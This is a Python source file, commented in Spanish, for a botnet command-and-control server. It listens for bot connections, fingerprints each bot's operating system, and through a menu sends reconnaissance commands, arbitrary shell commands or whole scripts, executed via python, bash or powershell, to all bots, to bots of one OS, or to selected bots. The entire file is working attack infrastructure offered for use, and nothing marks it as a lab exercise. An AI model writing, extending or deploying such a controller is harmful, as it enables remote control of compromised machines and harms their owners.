import socket
import threading

HOST = "172.31.128.167" # IP del servidor
PORT = 9999 # Puerto que escucha
bots = [] # List de bots
bot_ids = {} # Diccinario con los IDS de los bots
sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot

def manejar_bot(conn, addr, bot_id): 
    
    """
    Maneja una conexión con un bot. Recibe el socket de la conexión, la
    dirección del bot y su ID. Intenta detectar el sistema operativo del bot
    y lo almacena en el diccionario sistemas_operativos. Luego, entra en un
    bucle de espera en el que muestra los mensajes enviados por el bot. Si
    ocurre un error, se cierra la conexión y se eliminan las entradas del
    bot de los diccionarios.
    """
    
    print(f"Bot {bot_id} conectado desde {addr}")

    # Detectar si el bot usa Windows o Linux
    try:
        conn.send("detect_os".encode("utf-8")) # Enviar el comando para detectar el SO
        os_info = conn.recv(1024).decode("utf-8").strip().lower() # Recibir la respuesta
        sistemas_operativos[conn] = "windows" if "windows" in os_info else "linux" # Almacenar el SO
        print(f"Bot {bot_id} identificado como {sistemas_operativos[conn].capitalize()}") # Imprimir el SO
    except Exception as e:
        print(f"Error al detectar OS de {addr}: {e}") # Imprimir el error
        sistemas_operativos[conn] = "desconocido" # Almacenar el SO desconocido

    while True:
        try:
            data = conn.recv(4096) # Recibir el mensaje
            if not data: # Si el mensaje está vacío
                break 
            print(f"Mensaje recibido de {addr}: {data.decode('utf-8', errors='ignore')}") # Imprimir el mensaje
        except Exception as e:
            print(f"Error con {addr}: {e}") # Imprime el error
            break
    
    conn.close() # Cerrar la conexión
    bots.remove(conn) # Eliminar el bot de la lista
    del bot_ids[conn] # Eliminar el ID del bot
    del sistemas_operativos[conn] # Eliminar el SO del bot
    print(f"Bot {bot_id} desconectado") # Imprimir que el bot se desconecto

def servidor_CnC():
    
    """
    Inicia el servidor C&C. Abre un socket y espera conexiones de bots. 
    Crea un hilo para manejar las conexiones y entra en un bucle principal 
    que muestra un menú para enviar comandos a los bots, cerrar conexiones 
    o salir de la consola.
    """
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket
    server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto
    server.listen(5) # Escuchar conexiones
    print(f"Escuchando en {HOST}:{PORT}...") # Imprimir que el servidor esta escuchando
    
    threading.Thread(target=aceptar_conexiones, args=(server,)).start() # Crear un hilo para aceptar conexiones

    while True:
        print("\nMenú Principal:")
        print("1. Listar bots conectados")
        print("2. Enviar comandos")
        print("3. Cerrar conexión con un bot")
        print("4. Salir")
        opcion = input("Seleccione una opción: ")

        if opcion == "1":
            listar_bots()
        elif opcion == "2":
            menu_comandos()
        elif opcion == "3":
            cerrar_conexion_bots()
        elif opcion == "4":
            print("Saliendo de la consola...")
            exit()
        else:
            print("Opción no válida. Intente de nuevo.")

def aceptar_conexiones(server):
    
    """
    Función que acepta conexiones entrantes en el servidor C&C y
    las asigna a un hilo para manejarlas. Cada bot se asigna un
    identificador único que se utiliza para enviar comandos y
    cerrar conexiones.
    """
    
    bot_id = 1 # Contador de bots
    while True:
        conn, addr = server.accept() # Aceptar la conexión
        bots.append(conn) # Agregar el bot a la lista
        bot_ids[conn] = bot_id # Asignar el ID del bot
        threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start() # Crear un hilo para manejar la conexión
        bot_id += 1 # Incrementar el contador de bots

def listar_bots():
    
    """
    Muestra la lista de bots conectados actualmente, con su respectivo
    identificador, sistema operativo y dirección IP.
    """
    
    if bots:
        print("\nBots conectados:")
        for bot in bots: # Recorrer la lista de bots
            so = sistemas_operativos.get(bot, "Desconocido") # Obtener el SO del bot
            print(f"Bot {bot_ids[bot]} ({so.capitalize()}): {bot.getpeername()}") # Imprimir el bot
    else:
        print("No hay bots conectados.")

def menu_comandos():
    
    """
    Muestra un menú con las órdenes disponibles para los bots.
    Pide al usuario seleccionar una orden y, según la elección,
    prepara el comando para enviar a los bots. Si el usuario elige
    una orden personalizada o un script, pide ingresar el texto
    del comando/script y lo envía a los bots.
    """
    
    if not bots:
        print("No hay bots conectados.")
        return

    print("\nÓrdenes disponibles:")
    print("1. Hacer PING a una dirección específica")
    print("2. Obtener información del sistema")
    print("3. Listar archivos en el directorio actual")
    print("4. Ver procesos en ejecución")
    print("5. Consultar conexiones de red")
    print("6. Obtener la IP pública")
    print("7. Ejecutar un comando personalizado")
    print("8. Ejecutar un script remoto")
    
    orden = input("Seleccione una orden: ")
    comando_windows = ""
    comando_linux = ""

    if orden == "1":
        direccion = input("Ingrese la dirección a hacer PING: ")
        comando_windows = f"ping {direccion}"
        comando_linux = f"ping -c 4 {direccion}"
    elif orden == "2":
        comando_windows = "systeminfo"
        comando_linux = "uname -a && lsb_release -a"
    elif orden == "3":
        comando_windows = "dir"
        comando_linux = "ls -lah"
    elif orden == "4":
        comando_windows = "tasklist"
        comando_linux = "ps aux"
    elif orden == "5":
        comando_windows = "netstat -ano"
        comando_linux = "netstat -tunapl"
    elif orden == "6":
        comando_windows = "curl ifconfig.me"
        comando_linux = "curl ifconfig.me"
    elif orden == "7":
        comando_windows = input("Ingrese el comando personalizado para Windows: ")
        comando_linux = input("Ingrese el comando personalizado para Linux: ")
    elif orden == "8":
        print("Seleccione el tipo de script:")
        print("1. Python")
        print("2. Bash")
        print("3. Otro (especificar)")
        
        tipo = input("Ingrese la opción: ")

        if tipo == "1":
            extension = "py"
            interprete_linux = "python3 -c"
            interprete_windows = "python -c"
        elif tipo == "2":
            extension = "sh"
            interprete_linux = "bash -c"
            interprete_windows = "powershell -Command"
        elif tipo == "3":
            extension = input("Ingrese la extensión del script (ejemplo: ps1, rb, pl): ")
            interprete_linux = input("Ingrese el comando para ejecutarlo en Linux: ")
            interprete_windows = input("Ingrese el comando para ejecutarlo en Windows: ")
        else:
            print("Opción inválida.")
            return

        print("\n¿Cómo desea proporcionar el script?")
        print("1. Escribirlo aquí")
        print("2. Proporcionar la ruta de un archivo")
        
        metodo = input("Ingrese la opción: ")

        if metodo == "1":
            print(f"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:")
            lineas = []
            while True:
                try:
                    linea = input()
                    if linea.strip().upper() == "EOF":  # Detectar EOF
                        break
                    lineas.append(linea)
                except KeyboardInterrupt:  # Capturar Ctrl+C para salir
                    print("\nEntrada cancelada.")
                    return
            script = "\n".join(lineas)  # Unir líneas en una sola cadena
        elif metodo == "2":
            ruta = input("Ingrese la ruta del archivo: ")
            try:
                with open(ruta, "r", encoding="utf-8") as archivo:
                    script = archivo.read()
            except Exception as e:
                print(f"Error al leer el archivo: {e}")
                return
        else:
            print("Opción inválida.")
            return

        # Reemplazar comillas para evitar problemas con la ejecución remota
        script = script.replace('"', r'\"').replace("'", r"\'")

        comando_windows = f'{interprete_windows} "{script}"'
        comando_linux = f"{interprete_linux} '{script}'"

        enviar_comando(comando_windows, comando_linux)
        
    else:
        print("Opción no válida.")
        return

    enviar_comando(comando_windows, comando_linux)

def enviar_comando(comando_windows, comando_linux):
    """
    Permite seleccionar a qué bots se enviará el comando: todos, solo Windows, solo Linux,
    un bot específico o una lista de bots.
    """
    if not bots:
        print("No hay bots conectados.")
        return

    print("\nSeleccione a qué bots enviar el comando:")
    print("1. Todos los bots")
    print("2. Solo bots Windows")
    print("3. Solo bots Linux")
    print("4. Un bot específico")
    print("5. Lista de bots específicos")
    
    seleccion = input("Ingrese su opción: ")

    bots_seleccionados = []

    if seleccion == "1":  # Todos los bots
        bots_seleccionados = bots

    elif seleccion == "2":  # Solo Windows
        bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == "windows"]

    elif seleccion == "3":  # Solo Linux
        bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == "linux"]

    elif seleccion == "4":  # Un bot específico
        listar_bots()
        try:
            bot_id = int(input("Ingrese el ID del bot: "))
            bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)
            if bot:
                bots_seleccionados.append(bot)
            else:
                print("ID de bot no válido.")
                return
        except ValueError:
            print("ID inválido. Debe ingresar un número.")
            return

    elif seleccion == "5":  # Lista de bots específicos
        listar_bots()
        try:
            bot_ids_seleccionados = [int(id.strip()) for id in input("Ingrese los IDs de los bots separados por comas: ").split(",") if id.strip().isdigit()]
            bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]
            if not bots_seleccionados:
                print("No se encontraron bots con los IDs proporcionados.")
                return
        except ValueError:
            print("Entrada inválida. Debe ingresar números separados por comas.")
            return
    else:
        print("Opción no válida.")
        return

    # Enviar el comando solo a los bots seleccionados
    for bot in bots_seleccionados:
        enviar_comando_a_bot(bot, comando_windows, comando_linux)


def enviar_comando_a_bot(bot, comando_windows, comando_linux):
    """
    Envia un comando a un bot específico según su sistema operativo.
    """
    so = sistemas_operativos.get(bot, "desconocido")  # Obtener el SO del bot
    comando = comando_windows if so == "windows" else comando_linux  # Comando adecuado

    try:
        bot.send(comando.encode('utf-8'))  # Enviar el comando
        print(f"Orden enviada a bot {bot_ids[bot]} ({so.capitalize()})")  # Confirmación
    except Exception as e:
        print(f"Error al enviar orden a {bot.getpeername()}: {e}")


def cerrar_conexion_bots():
    
    """
    Cierra la conexión con un bot seleccionado por el usuario.
    
    El usuario puede seleccionar a los bots a los que quiere cerrar la conexión
    mediante un ID o bien escribir "todos" para cerrar la conexión con todos
    los bots conectados.
    
    :return: None
    """
    
    if not bots:
        print("No hay bots conectados.")
        return

    listar_bots()
    
    try:
        bot_id = int(input("Seleccione el ID del bot cuya conexión quiere cerrar: ")) # Obtener el ID del bot seleccionado
    except ValueError:
        print("ID inválido. Debe ingresar un número.")
        return

    bot = next((b for b in bots if bot_ids.get(b) == bot_id), None) # Buscar el bot con el ID correspondiente
    
    if not bot: # Si no se encuentra el bot
        print(f"ID de bot {bot_id} no válido.") # Imprimir un mensaje de error
        return

    try:
        bot.close() # Cerrar la conexión
        print(f"Conexión con el bot {bot_id} cerrada.") # Imprimir un mensaje de confirmación
    except Exception as e:
        print(f"Error al cerrar la conexión con el bot {bot_id}: {e}")

    if bot in bots:
        bots.remove(bot) # Eliminar el bot de la lista

    if bot in bot_ids:
        del bot_ids[bot] # Eliminar el ID del bot

    if bot in sistemas_operativos:
        del sistemas_operativos[bot] # Eliminar el SO del bot

    print(f"Bot {bot_id} eliminado correctamente del sistema.")


if __name__ == "__main__":
    servidor_CnC()
